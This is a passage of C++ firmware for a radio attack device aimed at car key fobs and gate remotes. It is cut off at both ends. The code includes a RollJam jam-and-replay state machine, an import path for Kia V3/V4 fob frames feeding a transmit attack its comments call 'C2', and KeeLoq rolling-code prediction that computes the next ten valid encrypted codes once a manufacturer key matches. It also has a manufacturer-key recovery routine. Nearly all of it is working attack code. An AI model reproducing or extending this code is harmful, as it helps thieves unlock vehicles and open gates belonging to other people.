      // Done. Stop the jam on this path too: a jam that will not stop is the worst
      // failure mode of any transmitting feature in this firmware.
      if(jamActive) stopJam();
      setLed(0,150,65);
      rjLastJson="{\"event\":\"rolljam\",\"state\":\"done\",\"held\":true}";
      serialEmit(rjLastJson);
      rjState=RJ_DONE;
      // Return to IDLE rather than parking in DONE. The held code 2 stays in
      // rjBuf2/rjLen2, so /api/rolljam_replay still works, but the machine must be
      // re-armable: both rjArm() and rjStart() require RJ_IDLE, so leaving the state
      // at DONE would brick the feature after one use. Reset the transient fields
      // only — rjLen2/rjBuf2 are deliberately preserved as the banked code.
      rjState=RJ_IDLE;
      rjArmed=false; rjReplayed=true;
      break;
    }
    default: break;
  }
}


//   +1  ctr[1] follows ctr[0] within the protocol's window
//    0  no decoded counter is available, so order cannot be judged
//   -1  ctr[1] is clearly behind ctr[0] (or equal): refuse
static int fbkCtrOrder(){
  if(fbkCount<2) return 0;
  if(!fbkBuf[0].hasCtr || !fbkBuf[1].hasCtr) return 0;
  uint32_t a=fbkBuf[0].ctr, b=fbkBuf[1].ctr;
  if(a==b) return -1;
  // Forward delta with 16-bit wrap (the common width). A backward step larger than
  // half the range means the second entry precedes the first, not that it wrapped.
  uint32_t fwd=((b - a) & 0xFFFF);
  return (fwd>=1 && fwd<=0x8000) ? 1 : -1;
}

// Cheap content hash over the width array. Used only to answer "are these two
// stored blocks byte-identical", which is the necessary condition when no decoded
// counter is available.
static uint32_t fbkHash(const uint16_t* w,int len){
  uint32_t h=2166136261UL;
  for(int i=0;i<len;i++){ h^=w[i]; h*=16777619UL; }
  h^=(uint32_t)len; h*=16777619UL;
  return h;
}

// Parse a decode's "ctr" field. Values are emitted as decimal by the decoders that
// have a counter; a leading 0x would mean hex.
static bool fbkParseCtr(const String& dec,uint32_t& out){
  String cs=jsonRawField(dec,"ctr");
  if(!cs.length()) return false;
  cs.trim();
  const char* p=cs.c_str();
  int base=10;
  if(p[0]=='0'&&(p[1]=='x'||p[1]=='X')){ base=16; p+=2; }
  char* end=nullptr;
  unsigned long v=strtoul(p,&end,base);
  if(end==p) return false;
  out=(uint32_t)v;
  return true;
}

// ─── Uniform-pulse predicate (research/19 §2, shared) ────────────────────────
// True when a pulse train has no bit edges: essentially every width is the same, so there
// is no short/long modulation for a decoder to read. A genuine OOK frame is 1:2 short:long,
// so the max is at least ~1.5x the min; a uniform train stays within 10%.
//
// Factored out so the live-capture path and the stored-frame import apply the SAME test.
// Two copies of this arithmetic would eventually disagree, and the guard's whole value is
// that a frame is judged identically however it arrived.
//
// Only meaningful for buffers of >=64 pulses — a 20-pulse burst is too few to judge a
// distribution, and a legitimately single-width fixed-code frame of that size would be
// wrongly refused.
static bool ks_noBitEdges(const uint16_t* w,int len,uint32_t& widthOut){
  widthOut=0;
  if(len<64) return false;
  uint32_t mn=0xFFFFFFFF,mx=0;
  for(int i=0;i<len;i++){ if(w[i]<mn)mn=w[i]; if(w[i]>mx)mx=w[i]; }
  widthOut=mn;
  return (mn>0 && (uint32_t)mx*100 < (uint32_t)mn*110);
}

// ─── Frame trimming (research/11 §2 F2) ──────────────────────────────────────
// A capture is NOT one code. captureSignal fills CAP_SZ=512 pulses or runs to its
// time bound, and a fob press emits its frame repeatedly, so one buffer entry holds
// several repeats of the same code. Measured on KIA V3 N1 RAW.sub: the frame repeat
// unit is 162 pulses and a 512-pulse capture therefore holds ~3.2 repeats. Both C1
// and C2 depend on "one block = one code", so the stored block must be trimmed to a
// single frame.
//
// Why trim after capture rather than bound the capture itself (research/11 §1):
//   · The capture path cannot exit before its 100 ms floor, and an 8 ms gap is
//     unreachable inside that window.
//   · More fundamentally, the measured gap distribution is smooth and decaying with
//     no clean separator near 8 ms, so a mid-capture decision would be guesswork with
//     only a partial view of the burst.
//   · The reference corpus stores fixed 512-pulse blocks, which is independent
//     evidence that a reliable time-based frame boundary is not detectable at capture
//     time for this protocol.
// Trimming after capture can use the WHOLE block to find the boundary.
//
// The boundary differs per protocol, so the caller supplies it. For Kia V3/V4 the
// repeat is the sync pulse: a frame contains exactly one pulse wider than ~1000 us,
// and the sync-to-sync spacing is 162 pulses (measured 135 times in the file). Any
// pulse-count rule is protocol-specific for the same reason.
//
// Returns the number of pulses in the trimmed frame written to `out`, or 0 when no
// frame could be isolated (in which case the caller should keep the full block).
//
// `framePitchPulses` is the protocol's repeat pitch — the pulse distance from one
// frame separator to the next. For Kia V3/V4 that is 162 (measured 135-137 times in
// the corpus capture). It is what makes this selective: see the locator note below.
// `anchorOut` is optional (may be -1's address? no: pass nullptr to ignore). When given, it
// receives the index in `w` of the separator the trim locked onto, so a caller can report
// WHERE a frame was found -- research/23 §2.2 asked for this because a refusal otherwise
// gives no hint whether the body was wrong or the search too narrow.
static int klTrimToFrame(const uint16_t* w,int len,uint16_t* out,int outCap,
                         uint32_t gapUs,int framePitchPulses,int pitchTolPulses,
                         int* anchorOut=nullptr){
  if(anchorOut) *anchorOut=-1;
  if(len<8||outCap<8||gapUs<100) return 0;

  // Locate the frame train. This must be selective, because a real capture opens with
  // leading noise that contains wide pulses too: the head of KIA V3 N1 has >1000 us
  // pulses at 3, 5, 9, 11 spaced 2-4 apart, and the region before the train has 60+
  // of them at 2-6 pulse spacing.
  //
  // Two weaker rules were tried on the real capture and both locked onto noise:
  //   · first wide pulse            -> 6-pulse slice from index 11
  //   · two consecutive equal gaps  -> picked noise intervals of 139/123/101 pulses
  //     (e.g. a slice starting 4815 whose first pulses are 562, 99, 252, 151 — no
  //     preamble), giving 22/65 wrong anchors in the first 20k pulses.
  //
  // What works is the REPEAT PITCH: a genuine frame separator is followed by another
  // separator almost exactly one frame pitch later. Measured on the real capture:
  // anchoring that way decodes 59/60 slices, versus 43/65 for the equal-gap rule.
  const int pitchTol = (pitchTolPulses>0)?pitchTolPulses:8;
  int s=-1;
  for(int i=0;i<len;i++){
    if(w[i]<=gapUs) continue;
    int j=-1; for(int k=i+1;k<len;k++){ if(w[k]>gapUs){ j=k; break; } }
    if(j<0) break;
    int d=j-i;
    if(d<framePitchPulses-pitchTol || d>framePitchPulses+pitchTol) continue;
    s=i; break;
  }
  if(s<0) return 0;
  if(anchorOut) *anchorOut=s;      // where the frame train was located

  // Include the preamble that precedes the separator. Measured on KIA V3 N1: a slice
  // starting 20 pulses before the sync decodes with a stable counter, and the
  // decoder's own preamble scan needs a run of short+short pairs to lock on.
  int start=(s>=20)?(s-20):0;

  // End one pitch after the separator, so the slice is exactly one frame and the
  // closing separator of the NEXT frame is not included.
  int end=s+framePitchPulses;
  if(end>=len) end=len-1;
  if(end<=s) return 0;
  int n=end-start+1;
  if(n>outCap) n=outCap;
  if(n<8) return 0;
  for(int i=0;i<n;i++) out[i]=w[start+i];
  return n;
}

// Kia V3/V4 frame constants. These are measured FROM ONE CAPTURE, and the confidence
// they carry should be read with that in mind (research/12 §1):
//   separator : >1000 us. te_long is 800 us, so the boundary must clear that plus
//               jitter; the measured separator distribution supports 1000 us.
//   pitch     : 162 pulses from one separator to the next, observed 135 times in
//               KIA V3 N1 RAW.sub. Note only 4% of all separator-to-separator deltas
//               in that capture fall inside the +/-8 window — the rule works because it
//               scans for the FIRST match and the real train appears early, not because
//               162 dominates the capture. That is a narrower margin than a single
//               measured constant suggests.
//   pitch tol : +-8 pulses. Tighter missed frames whose pitch drifted; looser started
//               admitting noise.
//
// The pitch is one TRANSMITTER's repeat length. A different Kia V3/V4 remote, from a
// different year or a different encoder revision, may repeat a different number of
// times, and the +/-8 window would then find nothing. That case is handled safely — the
// trim returns 0 and the caller keeps the raw block — but note that the safe fallback
// MASKS the non-match rather than surfacing it: the stored entry silently goes back to
// being a multi-repeat block. rbArm/rjArm therefore gate on FbkEntry::trimmed /
// rjTrim1/rjTrim2 so the operator is told ("untrimmed-block") instead of getting a
// sequence that may be mis-sequenced.
#define KIA_V34_FRAME_GAP_US    1000u
#define KIA_V34_FRAME_PITCH_PULS  162
#define KIA_V34_FRAME_PITCH_TOL     8

// Trim a capture to one Kia V3/V4 frame.
// Returns 0 when no frame can be isolated; the caller must then keep the untrimmed
// block. A wrong trim is worse than a long block, because the decoder can still find
// a frame inside a multi-repeat block but cannot recover from a slice cut in the
// wrong place.
static int rjTrimKiaV34(const uint16_t* w,int len,uint16_t* out,int outCap,int* anchorOut){
  return klTrimToFrame(w,len,out,outCap,KIA_V34_FRAME_GAP_US,
                       KIA_V34_FRAME_PITCH_PULS,KIA_V34_FRAME_PITCH_TOL,anchorOut);
}


//
// The counter recorded here is what lets rbArm refuse a pair that is really the same
// code twice (§2.5). A capture whose decode carried no counter leaves hasCtr false,
// and rbArm falls back to the byte-identity check.
static bool fbkAppend(const uint16_t* w,int len,float mhz,bool startHigh,const String& decode){
  if(len<1 || len>CAP_SZ || fbkCount>=FBK_MAX) return false;
  // Trim to ONE frame before storing. A capture is not one code: captureSignal fills
  // CAP_SZ=512 pulses and a press emits its frame repeatedly, so a raw block is ~3
  // repeats. C2 transmits fbkBuf[0] then fbkBuf[1], and sending 3 repeats of a code
  // looks to the receiver like several presses rather than the one the sequence
  // depends on (research/11 §2 F2, root cause).
  //
  // The trim is protocol-specific and currently only Kia V3/V4 has a measured
  // boundary. When it does not apply, or finds no frame, the raw block is kept: a
  // wrong trim is worse than a long one, because the decoder can still find a frame
  // inside a multi-repeat block.
  static uint16_t trimmed[CAP_SZ];
  int useLen=len;
  const uint16_t* useW=w;
  bool didTrim=false;
  {
    int tl=rjTrimKiaV34(w,len,trimmed,CAP_SZ,nullptr);
    if(tl>0){ useLen=tl; useW=trimmed; didTrim=true; }
  }
  FbkEntry& e=fbkBuf[fbkCount];
  memcpy(e.w,useW,useLen*sizeof(uint16_t));
  e.len=useLen; e.freq=mhz; e.sh=startHigh;
  // Record whether the block is one frame or several. rbArm gates on this, because a
  // multi-repeat block makes C2 transmit several presses of each code and the operator
  // otherwise cannot tell an unsupported protocol from a mis-sequenced tool.
  e.trimmed=didTrim;
  uint32_t c=0;
  e.hasCtr = fbkParseCtr(decode,c);
  e.ctr    = c;
  e.ts     = millis();
  fbkCount++;
  return true;
}

// ─── Import a stored frame into fbkBuf (research/22 §3) ──────────────────────
//
// Why this exists: the ONLY writer to fbkBuf was the armed live-capture path, and on this
// board that path cannot produce a usable code — capture falls back to RSSI (no GDO0), the
// RSSI poll is ~1600 us against Kia's 400 us short pulse, so the buffer fills with uniform
// pulses and the no-bit-edges guard correctly refuses them. Result: fbkCount stays 0 and
// rbArm() refuses on need-2-codes. C2's input could not be produced at all.
//
// C2 is a TRANSMIT attack: its two codes are data, and nothing about it requires this board
// to have captured them. A code legitimately comes from another reader, the corpus in the tree,
// or a .sub posted over HTTP. This function is the missing door.
//
// It deliberately routes through the SAME validation as a live capture, so an imported
// frame is judged no differently from a captured one:
//   · the same klTrimToFrame trim (via fbkAppend), so `trimmed` means the same thing
//   · the same decoder for the counter, so `ctr`/`hasCtr` mean the same thing
//   · the same ks_noBitEdges refusal, so a uniform body is refused with the same reason
//   · the same fbkCount<FBK_MAX bound
//
// Returns true only when the entry was actually appended.
// ── Import staging (research/24 §2) ──────────────────────────────────────────
//
// TWO buffers, not four. An earlier version had four copies of a 3740-entry array -- the
// trim output plus three handler-local statics holding the parsed body -- costing 29.9 KB
// and taking RAM from 39% to 47%. The handlers are disjoint in lifetime: srv.handleClient()
// and the serial handler both run from the single loop() task and neither re-enters, so one
// array can serve all of them.
//
//   impStage : the parsed body; the trim's INPUT, and its search window
//   impFrame : the trim's OUTPUT, one frame, bounded by CAP_SZ
//
// Two separate arrays, deliberately. An in-place copy was tried first -- aliasing the trim's
// output onto the body array -- and it IS provably safe: klTrimToFrame reads w[start+i] while
// writing out[i], and start >= 0, so the read position never falls behind the write position.
// It was abandoned anyway: a reader should not have to prove that overlap is safe in order to
// trust the code, and a second 1 KB array is a cheap price for obviousness. The reasoning is
// repeated at the call site, which is the place a reader arrives from.
static uint16_t impStage[SUB_REPLAY_MAX_PULSES];   // the body (trim input)
static uint16_t impFrame[CAP_SZ];                  // one trimmed frame (trim output)
int impLastAnchor=-1;    // where the trim found the frame in the last import

static bool fbkImportFrame(const uint16_t* w,int len,float mhz,bool startHigh,String& err){
  if(fbkCount>=FBK_MAX){
    err="fbk-full";
    serialEmit(String("{\"event\":\"import_rejected\",\"reason\":\"fbk-full\",\"max\":")+String(FBK_MAX)+"}");
    return false;
  }
  if(len<4){ err="too-few-pulses"; return false; }

  // Same guard as a live capture. An imported uniform body is not a frame either, and
  // accepting it here would put non-data into a buffer whose whole purpose is valid codes.
  uint32_t uWidth=0;
  if(ks_noBitEdges(w,len,uWidth)){
    err="no-bit-edges";
    serialEmit(String("{\"event\":\"import_rejected\",\"reason\":\"no-bit-edges\",")+
      "\"pulses\":"+String(len)+",\"width_us\":"+String(uWidth)+
      ",\"detail\":\"imported frame has uniform pulse widths, so there is no short/long "
      "modulation: not a decodable frame\"}");
    return false;
  }

  // Trim FIRST, over the whole search window. The frame may sit well past CAP_SZ (measured:
  // the corpus file's first trimmable frame is at index 469 of a 512-window, but in a full
  // body the anchor can be anywhere in ~1868 pulses), and rfBuf -- which decodeSignal reads
  // -- is only CAP_SZ wide. Trimming first yields a single frame that always fits, so the
  // decoder sees it regardless of where in the body it was found.
  // Trim into the FRAME stage, reading from the body stage. Two separate arrays rather than
  // an in-place copy: an in-place forward copy is provably safe here (klTrimToFrame reads at
  // index start+i while writing i, so reads always trail writes), but a reader should not
  // have to prove that to trust the code. One extra 1 KB is a cheap price for obviousness.
  int anchor=-1;
  int tl=rjTrimKiaV34(w,len,impFrame,CAP_SZ,&anchor);
  impLastAnchor=anchor;
  const uint16_t* fw;
  int flen;
  if(tl>0){ fw=impFrame; flen=tl; }
  else {
    // No Kia V3/V4 pitch pair. That is NOT a failure for any other protocol: rjTrimKiaV34 is
    // Kia-specific by construction (it looks for the 162-pulse repeat), so a Toyota, CAME,
    // Nice or Ford body can never satisfy it. Refusing here meant the import path could only
    // ever accept Kia-format captures, which is narrower than the docs implied and blocked
    // importing the one family the bench actually needs (research/43).
    //
    // fbkAppend already keeps the raw block when the trim finds nothing -- "a wrong trim is
    // worse than a long one, because the decoder can still find a frame inside a multi-repeat
    // block" -- so this makes the import path agree with the capture path instead of being
    // stricter than it. Capped to CAP_SZ because that is what an FbkEntry holds.
    flen=(len>CAP_SZ)?CAP_SZ:len;
    if(flen<4){ err="too-few-pulses"; return false; }
    fw=w;
    serialEmit(String("{\"event\":\"import_kept_raw\",\"reason\":\"no-kia-frame-found\",")+
      "\"pulses\":"+String(len)+",\"held\":"+String(flen)+
      ",\"detail\":\"no Kia V3/V4 pitch pair; body kept as-is, as a live capture would be. "
      "Set the frame boundary yourself if the body holds several repeats\"}");
  }

  // Decode through the real path so the counter comes from the same decoder a capture uses.
  // decodeSignal() reads the rfBuf/rfLen globals, so stage the TRIMMED frame there, exactly
  // as captureSignal leaves them. Saved and restored because a caller may be mid-operation.
  // Note: this cannot fire. klTrimToFrame clamps its result to outCap before returning
  // (`if(n>outCap) n=outCap;`), and the call above passes CAP_SZ as outCap, so tl<=CAP_SZ
  // always. Kept as a cheap belt-and-braces guard against a future caller passing a larger
  // outCap -- but be aware it protects nothing today, rather than assuming it does.
  if(flen>(int)CAP_SZ){ err="too-long"; return false; }
  static uint16_t saved[CAP_SZ];
  int savedLen=rfLen; float savedFreq=rfFreq; bool savedHigh=rfStartHigh;
  memcpy(saved,rfBuf,(size_t)rfLen*sizeof(uint16_t));
  memcpy(rfBuf,fw,(size_t)flen*sizeof(uint16_t));
  rfLen=flen; rfFreq=mhz; rfStartHigh=startHigh;
  String dec=decodeSignal();
  // restore
  memcpy(rfBuf,saved,(size_t)savedLen*sizeof(uint16_t));
  rfLen=savedLen; rfFreq=savedFreq; rfStartHigh=savedHigh;

  // Append the TRIMMED frame. fbkAppend would call the same trim again, which is harmless
  // (a single frame contains no second pitch pair, so it passes through) but wasteful; more
  // importantly it would set `trimmed` from a second trim result rather than from the one
  // performed above over the full search window.
  if(!fbkAppend(fw,flen,mhz,startHigh,dec)){
    err="append-failed";
    return false;
  }
  err="";
  return true;
}

// History push
static void ks_hPush(const HistEntry& e){
  hist[histI]=e; histI=(histI+1)%HIST_SZ; if(histC<HIST_SZ) histC++;
}

// Delta estimate from history — handles counter wrap-around and missed presses
static int32_t ks_estDelta(uint32_t sn,uint8_t proto,uint32_t ctr){
  int32_t best=1; int cnt=0;
  // Determine counter wrap mask per protocol (most are 16-bit or 24-bit)
  uint32_t wrapMask=0xFFFF;
  if(proto==3||proto==4) wrapMask=0xFFFFFF; // Somfy/Nice 24-bit
  for(int i=0;i<(int)histC;i++){
    int idx=(histI-1-i+HIST_SZ)%HIST_SZ;
    if(hist[idx].sn==sn&&hist[idx].proto==proto&&hist[idx].ctr!=ctr){
      // Forward delta with wrap-around
      int32_t d=(int32_t)((ctr-hist[idx].ctr)&wrapMask);
      // Accept deltas 1-8191: handles up to ~8k missed presses (very tolerant)
      if(d>0&&d<8192){best=d;cnt++;if(cnt>=3)break;}
    }
  }
  return best;
}

// Linear time-based extrapolation of rolling counter rate (ctr/sec)
// Useful when multiple frames from the same device are in history
static float ks_linExtrap(uint32_t sn,uint8_t proto,uint32_t lastCtr,uint32_t lastTs){
  float st=0,sc=0,stt=0,stc=0; int n=0;
  for(int i=0;i<(int)histC&&n<10;i++){
    int idx=(histI-1-i+HIST_SZ)%HIST_SZ;
    const HistEntry& h=hist[idx];
    if(h.sn!=sn||h.proto!=proto) continue;
    float t=(float)(int32_t)(lastTs-h.ts)/1000.f;
    float c=(float)(int32_t)(lastCtr-h.ctr);
    st+=t; sc+=c; stt+=t*t; stc+=t*c; n++;
  }
  if(n<2) return 1.0f;
  float d=n*stt-st*st; return (fabsf(d)<0.001f)?1.0f:(n*stc-st*sc)/d;
}

// Human-readable learning-type name, for logs and JSON.
static const char* ks_klLearnName(uint8_t l){
  switch(l){
    case KL_SIMPLE:       return "simple";
    case KL_NORMAL:       return "normal";
    case KL_SECURE:       return "secure";
    case KL_MAGIC_XOR1:   return "magic-xor-1";
    case KL_FAAC:         return "faac";
    case KL_MAGIC_SER1:   return "magic-serial-1";
    case KL_MAGIC_SER2:   return "magic-serial-2";
    case KL_MAGIC_SER3:   return "magic-serial-3";
    case KL_BENINCA_ARC:  return "beninca-arc";
    case KL_KINGGATES:    return "kinggates";
    case KL_JAROLIFT:     return "jarolift";
    case KL_HEURISTIC:    return "heuristic";
    default:              return "unknown";
  }
}

// KeeLoq prediction — correct Microchip TB003 / AN742 key diversification + full hop computation
static KLPred ks_klPredict(const KLFrame& f,uint32_t nowMs){
  KLPred p={};
  p.linEst=1.0f; p.kname=""; p.foundKey=0;

  // ── Collect every key that explains this frame ──────────────────────────────
  // All matches are gathered into `cand[]` rather than committing on the first
  // hit, because V1 has to know which keys matched BEFORE it can decide whether
  // one of them repeats the previous frame's winner.
  KLCand cand[KL_CAND_MAX];
  uint8_t ncand = 0;
  // Record a match; ignores duplicates (the same device key can be reached by
  // more than one derivation mode) and stops at the array bound.
  #define CAND_ADD(_name,_key,_learn,_sus)                                      \
    do {                                                                        \
      if(ncand < KL_CAND_MAX){                                                  \
        bool _dup_=false;                                                       \
        for(uint8_t _i=0;_i<ncand;_i++) if(cand[_i].key==(uint64_t)(_key)) _dup_=true; \
        if(!_dup_){ cand[ncand].name=(_name); cand[ncand].key=(uint64_t)(_key);  \
                    cand[ncand].learn=(_learn); cand[ncand].suspect=(_sus); ncand++; } \
      }                                                                         \
    } while(0)

  // 0. User-loaded keys FIRST — these are explicitly chosen for this device
  //    family, so a match here is the most trustworthy. Try both learning modes.
  for(int i=0;i<MAX_USER_KEYS;i++){
    if(USR_KEYS[i].magic != USR_KEY_MAGIC) continue;
    // (a) Simple/seed learning — device key == mfr key
    if(ks_klSnMatch(ks_klDecrypt(f.hop, USR_KEYS[i].key), f.sn))
      CAND_ADD(USR_KEYS[i].name, USR_KEYS[i].key, KL_SIMPLE, false);
    // (b) Normal learning /ENC (TB003 / AN742, encrypt-based form)
    { uint16_t snLo = (uint16_t)(f.sn & 0xFFFF);
      uint16_t snHi = (uint16_t)(f.sn >> 16);
      uint32_t devLo = ks_klEncrypt((uint32_t)snLo, USR_KEYS[i].key);
      uint32_t devHi = ks_klEncrypt((uint32_t)snHi | 0x20000000UL, USR_KEYS[i].key);
      uint64_t devKey = ((uint64_t)devHi << 32) | (uint64_t)devLo;
      if(ks_klSnMatch(ks_klDecrypt(f.hop, devKey), f.sn))
        CAND_ADD(USR_KEYS[i].name, devKey, KL_NORMAL, false);
    }
    // (c) Standard Decrypt form (Microchip TB003 / AN742)
    { uint32_t sn28c = f.sn & 0x0FFFFFFFUL;
      uint32_t dL3 = ks_klDecrypt(sn28c | 0x20000000UL, USR_KEYS[i].key);
      uint32_t dH3 = ks_klDecrypt(sn28c | 0x60000000UL, USR_KEYS[i].key);
      uint64_t dk3 = ((uint64_t)dH3 << 32) | (uint64_t)dL3;
      if(ks_klSnMatch(ks_klDecrypt(f.hop, dk3), f.sn))
        CAND_ADD(USR_KEYS[i].name, dk3, KL_NORMAL, false);
    }
    // (d) Magic XOR Type-1 (Beninca and compatible clone chips)
    { uint32_t sn28d = f.sn & 0x0FFFFFFFUL;
      uint64_t dk4 = (((uint64_t)sn28d << 32) | (uint64_t)sn28d) ^ USR_KEYS[i].key;
      if(ks_klSnMatch(ks_klDecrypt(f.hop, dk4), f.sn))
        CAND_ADD(USR_KEYS[i].name, dk4, KL_MAGIC_XOR1, false);
    }
  }

  // 1. Static manufacturer keys — simple learning: device key == mfr key.
  //    A hit here is only an identification if the entry has a recorded learning
  //    type and is a real key, so a factory default (all-zero / all-ones) or an
  //    untyped entry is flagged unconfirmed.
  for(int i=0;i<N_MFR_KEYS;i++){
    if(ks_klSnMatch(ks_klDecrypt(f.hop,ks_unmaskMfrKey(MFR_KEYS[i].key)),f.sn))
      CAND_ADD(MFR_KEYS[i].name, ks_unmaskMfrKey(MFR_KEYS[i].key), MFR_KEYS[i].learn, MFR_KEYS[i].suspect!=0);
  }

  // 2. Try SN-derived keys: the derivation each key declares (normal for a
  //    KL_NORMAL key, magic-serial for a clone key, and so on), plus the
  //    heuristic modes for keys whose type is unrecorded.
  // static: 73 keys × 14 modes × 24 B = ~24.5 kB of BSS. Off the stack, which
  // is the point — this array on the stack was the v3.41 overflow. If BSS ever
  // gets tight, the name pointer (8 B/entry) can be replaced by an index into
  // MFR_KEYS, halving it; not done here because it obscures the code.
  // Safe: ks_klPredict is only ever called from the single loop() task.
  {
    static MfrKey derived[MAX_DERIVED_KEYS];
    uint16_t nd=ks_deriveMfrKeys(f.sn,derived);
    for(uint16_t i=0;i<nd;i++){
      if(ks_klSnMatch(ks_klDecrypt(f.hop,derived[i].key),f.sn))
        // Unconfirmed when the derivation is heuristic or the key is a factory
        // default: the arithmetic fits, but it is not an identification.
        CAND_ADD(derived[i].name, derived[i].key, derived[i].learn,
                 derived[i].suspect!=0 || derived[i].learn==KL_HEURISTIC);
    }
  }
  #undef CAND_ADD

  // ── V1 gate: a candidate is confirmed only if it repeats the previous frame ─
  // Prefer a confirmed candidate over an unconfirmed one, and among confirmed
  // candidates prefer a real typed key over a suspect/pattern entry, so the
  // reported identity is the strongest evidence available on this frame.
  int confirmed = -1, unconfirmed = -1;
  for(uint8_t i=0;i<ncand;i++){
    if(ks_klAgreeHas(f.sn, cand[i].key, f.hop)){
      if(confirmed < 0 || (cand[confirmed].suspect && !cand[i].suspect)) confirmed = (int)i;
    } else if(unconfirmed < 0){
      unconfirmed = (int)i;
    }
  }

  if(confirmed >= 0){
    // Confirmed: the same key matched on two consecutive frames.
    p.found  = true;
    p.pattern= cand[confirmed].suspect;
    p.kname  = cand[confirmed].name;
    p.foundKey = cand[confirmed].key;
    p.learn  = cand[confirmed].learn;
  } else {
    // Not confirmed. Report the best single-frame candidate so the UI can show
    // progress and ask for another press, but never as an identification.
    p.found  = false;
    p.candidate = (unconfirmed >= 0 || ncand > 0);
    int show = (unconfirmed >= 0) ? unconfirmed : 0;
    if(ncand > 0){
      p.kname    = cand[show].name;
      p.foundKey = cand[show].key;
      p.learn    = cand[show].learn;
      p.pattern  = cand[show].suspect;
    }
  }

  // Record this frame's candidates as the reference for the next one. Done for
  // every frame, matched or not, so a miss in between clears stale winners.
  ks_klAgreeCommit(f.sn, f.hop, cand, ncand);

  // 3. Compute predicted hop values (exact when key known, counter-only otherwise)
  p.delta=ks_estDelta(f.sn,0,f.rawCtr);
  p.linEst=ks_linExtrap(f.sn,0,f.rawCtr,nowMs);
  p.nextCtr=f.rawCtr+(p.found?1:max((int32_t)1,p.delta));

  if(p.found){
    // Key known: compute exact encrypted hop values for the next 10 counter steps
    for(uint8_t i=0;i<10;i++){
      uint32_t nextC=f.rawCtr+i+1;
      uint32_t pt=ks_klBuildPlain(f.btn,f.sn,(uint16_t)nextC);
      p.bw[i]=ks_klEncrypt(pt,p.foundKey);
    }
    p.nextHop=p.bw[0];
  } else {
    // Key unknown: brute-window is delta-spaced counter candidates
    for(uint8_t i=0;i<10;i++) p.bw[i]=f.rawCtr+(uint32_t)(i+1)*max((int32_t)1,p.delta);
  }

  p.bwValid=true;
  return p;
}

// ─── Manufacturer-Key Recovery ───────────────────────────────────────────────
// Recovery matches consecutive presses of one button against the built-in
// manufacturer list and any keys saved on the card. It tries simple learning,
// normal learning (TB003 / AN742), and the XOR-seed variant, then keeps a
// candidate only when every frame decrypts to the same 28-bit serial, the
// same 4-bit button, and counters that step forward by 1–8. A published key
// that fits is offered for save. A miss stays a miss.

#define KR_MAX_FRAMES 5
struct KRSession {
  bool      active;
  uint8_t   need;       // frames requested (2–5)
  uint8_t   got;        // frames collected
  uint32_t  startedMs;
  KLFrame   frames[KR_MAX_FRAMES];
};
static KRSession KR = {};
static String krLastResultJson;   // last result from ks_krAnalyze() — read by HTTP endpoint

// Score how well a candidate key explains the N captured frames.
//
// Hard rejects (return 0 immediately):
//   • decrypted high-16 bits ≠ captured SN high-16
//     (Microchip AN661: bits[31:28]=func + bits[27:16]=disc[11:0] — matching
//     all 16 of these against the received SN is ≈ 16 bits of constraint)
//   • decrypted button nibble inconsistent across frames
//   • counter delta outside [1,32] (or its wrap equivalent)
//
// Soft score (higher is better, used for tie-breaking):
//   Frame 0 :  +3 base
//   Per extra frame, delta-weighted:
//     Δ 1-4  → +5  (consecutive or near-consecutive presses — very tight)
//     Δ 5-16 → +4  (normal walking distance)
//     Δ17-32 → +3  (fob was out of range; weaker evidence)
//   Cross-check bonus (+2/frame): decrypted function nibble matches the
//     physically received fixed-code btn field. This cross-validates the
//     encrypted half against the unencrypted half of the same packet.
//     Applied as a soft bonus (not hard reject) because some OEM clones
//     encode function differently in the two halves.
//
// On success, *outCtrs/*outBtns receive decoded values and *outMaxDelta
// receives the largest inter-frame counter delta seen (used for confidence).
// Returns 0 = no match, or a positive integer score for tie-break.
static int ks_krScore(uint64_t key, uint32_t* outCtrs, uint8_t* outBtns,
                      int32_t* outMaxDelta = nullptr){
  if(KR.got < 2) return 0;
  int     score    = 0;
  int32_t maxDelta = 0;
  uint32_t lastCtr = 0;
  uint8_t  firstBtn = 0;
  for(int i = 0; i < KR.got; i++){
    uint32_t dec      = ks_klDecrypt(KR.frames[i].hop, key);
    uint32_t decBtn   = (dec >> 28) & 0xF;
    uint32_t decCtr   = dec & 0xFFFF;
    if(!ks_klSnMatch(dec, KR.frames[i].sn)) return 0; // hard reject — discriminator mismatch
    if(i == 0){
      firstBtn = (uint8_t)decBtn;
      score += 3;
    } else {
      if(decBtn != firstBtn) return 0; // hard reject — button changed
      int32_t d = (int32_t)decCtr - (int32_t)lastCtr;
      if(d < 0) d += 65536; // handle 16-bit wrap
      if(d < 1 || d > 32) return 0; // hard reject — counter out of window
      // Delta-weighted scoring: tighter sequences earn more points
      score += (d <= 4) ? 5 : (d <= 16) ? 4 : 3;
      if(d > maxDelta) maxDelta = d;
    }
    // Soft cross-check: encrypted function nibble vs. received fixed-code btn
    if((uint8_t)decBtn == KR.frames[i].btn) score += 2;
    lastCtr = decCtr;
    if(outCtrs) outCtrs[i] = decCtr;
    if(outBtns) outBtns[i] = (uint8_t)decBtn;
  }
  if(outMaxDelta) *outMaxDelta = maxDelta;
  return score;
}

// Try every candidate key/mode combination and emit the result.
static void ks_krAnalyze(){
  if(KR.got < 2){
    serialEmit("{\"event\":\"key_recover_result\",\"ok\":false,\"reason\":\"need-more-frames\"}");
    return;
  }
  serialEmit(String("{\"event\":\"key_recover_analyzing\",\"frames\":") + KR.got + "}");

  uint32_t bestCtrs[KR_MAX_FRAMES] = {0};
  uint8_t  bestBtn[KR_MAX_FRAMES] = {0};
  uint64_t bestKey    = 0; // winning MFR seed key
  uint64_t bestDevKey = 0; // actual device key tried (mode-derived from bestKey)
  int      bestScore = 0;
  int32_t  bestMaxDelta = 0;
  String   bestName  = "";
  String   bestMode  = "";
  bool     bestPattern = true;
  uint8_t  bestLearn   = KL_UNKNOWN;   // learning type of the winning derivation

  uint16_t snLo  = (uint16_t)(KR.frames[0].sn & 0xFFFF);
  uint16_t snHi  = (uint16_t)(KR.frames[0].sn >> 16);

  // TRY_KEY scores one manufacturer key across every derivation: the simple
  // form, then all modes from the shared ks_deriveOneMfrKey() helper. Because it
  // is the same helper ks_klPredict() uses to search, a key found here is a key
  // the decoder will also find — the two cannot disagree.
  // bestDevKey tracks the actual device key that earned the best score, which is
  // what the user needs to save for future instant matching.
  #define TRY_KEY(_name, _mfrKey, _pat)                                        \
    do {                                                                       \
      uint64_t _mk = (_mfrKey);                                                \
      uint64_t _dks[N_KL_DERIV_MODES];                                         \
      ks_deriveOneMfrKey(KR.frames[0].sn, _mk, _dks);                          \
